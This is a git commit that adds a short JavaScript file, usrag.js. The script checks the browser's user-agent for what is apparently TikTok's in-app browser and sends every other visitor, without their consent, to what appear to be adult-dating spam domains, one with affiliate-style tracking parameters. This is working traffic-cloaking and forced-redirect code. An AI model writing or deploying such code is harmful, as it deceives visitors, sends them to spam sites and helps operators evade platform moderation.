45ffddd8cceddb683fdf85e8d643a8f3a2540795
fixyourself2024 <Shaiji16@gmail.com>
2024-08-09 19:47:56 +0300

    Create usrag.js

---
+++ usrag.js
@@ -0,0 +1,9 @@
+let agent = navigator.userAgent;
+
+if (agent.indexOf('music') >= 0) {
+  console.log('in tiktok app');
+} else {
+  window.location = 'https://lovepersonaldate.life/?u=rudktec&o=9kgp9mx';
+//  window.location = 'https://watchmenow.cam/';
+}
+// document.querySelector('body').innerText = agent;
